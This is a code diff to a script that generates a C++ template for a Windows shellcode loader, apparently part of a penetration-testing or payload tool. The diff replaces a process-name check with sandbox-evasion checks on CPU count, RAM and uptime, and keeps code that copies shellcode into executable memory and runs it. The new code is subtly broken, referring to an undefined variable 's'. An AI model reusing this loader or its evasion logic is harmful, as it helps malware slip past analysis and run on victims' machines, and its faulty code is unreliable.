@@ -32,40 +32,38 @@ def create_template():
     r'''#include <windows.h>
 #include <stdio.h>
 #include <iostream>
-#include <tlhelp32.h>
 #define MULTI_LINE_STRING(a) #a
 #pragma comment(linker, "/INCREMENTAL:YES")
 #pragma comment(lib, "user32.lib")
 #define WIN32_LEAN_AND_MEAN
 
-BOOL meptAndmerterpreterWasHere(CHAR *app) {
-    BOOL t0lg4 = FALSE;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
+BOOL checkResources() {
+  SYSTEM_INFO inf;
+  MEMORYSTATUSEX ms;
+  DWORD procNum;
+  DWORD ram;
 
-    if(Process32First(hSnap, &pe32)) {
-        do {
-            if(strcmp(pe32.szExeFile, app) == 0) {
-                t0lg4 = TRUE;
-                break;
-            }
-        } while(Process32Next(hSnap, &pe32));
-    }
+  GetSystemInfo(&inf);
+  procNum = s.dwNumberOfProcessors;
+  if (procNum < 2) return false;
 
-    CloseHandle(hSnap);
+  ms.dwLength = sizeof(ms);
+  GlobalMemoryStatusEx(&ms);
+  ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
+  if (ram < 2) return false;
 
-    return t0lg4;
+  return true;
 }
-
 
 int main(int argc, char** argv)
 {
-
-	 if(!meptAndmerterpreterWasHere("svchost.exe")) {
-        printf("Notepad.exe not running this system is hostile.\n");
-    } else {
 	
+	if (checkResources() == false) {
+    printf("possibly launched in sandbox :(\n");
+    return -2;
+    }
+    else{
+  
 	ULONGLONG uptime = GetTickCount() / 1000;
 	if (uptime < 1200) return false;
 		
@@ -80,9 +78,9 @@ int main(int argc, char** argv)
             j++;
         }
         
-        void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        memcpy(exec, shellcode, sizeof shellcode);
-        ((void(*)())exec)();
+        void* kardeslerpentest = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(kardeslerpentest, shellcode, sizeof shellcode);
+        ((void(*)())kardeslerpentest)();
         return 0;
        }
 }
